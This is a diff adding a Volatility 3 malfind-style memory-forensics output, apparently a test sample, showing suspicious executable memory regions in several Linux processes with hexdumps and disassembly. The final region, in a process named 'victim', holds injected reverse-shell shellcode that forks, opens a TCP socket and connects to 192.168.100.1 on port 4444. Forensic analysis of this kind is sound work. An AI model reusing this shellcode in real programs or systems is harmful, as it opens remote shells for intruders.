@@ -1,0 +1,83 @@
+Volatility 3 Framework 2.28.0
+
+PID	Process	Start	End	Path	Protection	Hexdump	Disasm
+
+641	networkd-dispat	0x7f41c7664000	0x7f41c7665000	Anonymous Mapping	rwx	
+00 00 00 00 00 00 00 00 53 00 00 00 00 00 00 00 ........S.......
+f3 0f 1e fa 4c 8d 15 f5 ff ff ff ff 25 07 00 00 ....L.......%...
+00 0f 1f 80 00 00 00 00 04 40 80 c6 41 7f 00 00 .........@..A...
+a8 fd 64 cf 20 56 00 00 00 a2 9c c6 41 7f 00 00 ..d. V......A...	
+0x7f41c7664000:	add	byte ptr [rax], al
+0x7f41c7664002:	add	byte ptr [rax], al
+0x7f41c7664004:	add	byte ptr [rax], al
+0x7f41c7664006:	add	byte ptr [rax], al
+0x7f41c7664008:	push	rbx
+0x7f41c7664009:	add	byte ptr [rax], al
+0x7f41c766400b:	add	byte ptr [rax], al
+0x7f41c766400d:	add	byte ptr [rax], al
+0x7f41c766400f:	add	bl, dh
+701	unattended-upgr	0x7ff3b9611000	0x7ff3b9612000	Anonymous Mapping	rwx	
+00 00 00 00 00 00 00 00 53 00 00 00 00 00 00 00 ........S.......
+f3 0f 1e fa 4c 8d 15 f5 ff ff ff ff 25 07 00 00 ....L.......%...
+00 0f 1f 80 00 00 00 00 04 e0 d0 b8 f3 7f 00 00 ................
+38 77 4f cb 83 55 00 00 00 c2 50 b8 f3 7f 00 00 8wO..U....P.....	
+0x7ff3b9611000:	add	byte ptr [rax], al
+0x7ff3b9611002:	add	byte ptr [rax], al
+0x7ff3b9611004:	add	byte ptr [rax], al
+0x7ff3b9611006:	add	byte ptr [rax], al
+0x7ff3b9611008:	push	rbx
+0x7ff3b9611009:	add	byte ptr [rax], al
+0x7ff3b961100b:	add	byte ptr [rax], al
+0x7ff3b961100d:	add	byte ptr [rax], al
+0x7ff3b961100f:	add	bl, dh
+1199	victim	0x7f63b4117000	0x7f63b42ac000	/usr/lib/x86_64-linux-gnu/libc.so.6	r-x	
+ff 35 02 20 1f 00 f2 ff 25 03 20 1f 00 0f 1f 00 .5. ....%. .....
+f3 0f 1e fa 68 35 00 00 00 f2 e9 e1 ff ff ff 90 ....h5..........
+f3 0f 1e fa 68 34 00 00 00 f2 e9 d1 ff ff ff 90 ....h4..........
+f3 0f 1e fa 68 00 00 00 00 f2 e9 c1 ff ff ff 90 ....h...........	
+0x7f63b4117000:	push	qword ptr [rip + 0x1f2002]
+0x7f63b4117006:	bnd jmp	qword ptr [rip + 0x1f2003]
+0x7f63b411700d:	nop	dword ptr [rax]
+0x7f63b4117010:	endbr64	
+0x7f63b4117014:	push	0x35
+0x7f63b4117019:	bnd jmp	0x7f63b4117000
+0x7f63b411701f:	nop	
+0x7f63b4117020:	endbr64	
+0x7f63b4117024:	push	0x34
+0x7f63b4117029:	bnd jmp	0x7f63b4117000
+0x7f63b411702f:	nop	
+0x7f63b4117030:	endbr64	
+0x7f63b4117034:	push	0
+0x7f63b4117039:	bnd jmp	0x7f63b4117000
+0x7f63b411703f:	nop	
+1199	victim	0x7f63b4357000	0x7f63b4358000	Anonymous Mapping	r-x	
+90 90 b8 39 00 00 00 0f 05 48 83 f8 00 74 02 cd ...9.....H...t..
+03 48 31 f6 48 f7 e6 48 ff c6 6a 02 5f 04 29 0f .H1.H..H..j._.).
+05 48 93 52 68 c0 a8 64 01 66 68 11 5c 66 6a 02 .H.Rh..d.fh.\fj.
+48 89 df 48 89 e6 6a 10 5a 6a 2a 58 0f 05 48 31 H..H..j.Zj*X..H1	
+0x7f63b4357000:	nop	
+0x7f63b4357001:	nop	
+0x7f63b4357002:	mov	eax, 0x39
+0x7f63b4357007:	syscall	
+0x7f63b4357009:	cmp	rax, 0
+0x7f63b435700d:	je	0x7f63b4357011
+0x7f63b435700f:	int	3
+0x7f63b4357011:	xor	rsi, rsi
+0x7f63b4357014:	mul	rsi
+0x7f63b4357017:	inc	rsi
+0x7f63b435701a:	push	2
+0x7f63b435701c:	pop	rdi
+0x7f63b435701d:	add	al, 0x29
+0x7f63b435701f:	syscall	
+0x7f63b4357021:	xchg	rbx, rax
+0x7f63b4357023:	push	rdx
+0x7f63b4357024:	push	0x164a8c0
+0x7f63b4357029:	push	0x5c11
+0x7f63b435702d:	push	2
+0x7f63b4357030:	mov	rdi, rbx
+0x7f63b4357033:	mov	rsi, rsp
+0x7f63b4357036:	push	0x10
+0x7f63b4357038:	pop	rdx
+0x7f63b4357039:	push	0x2a
+0x7f63b435703b:	pop	rax
+0x7f63b435703c:	syscall	
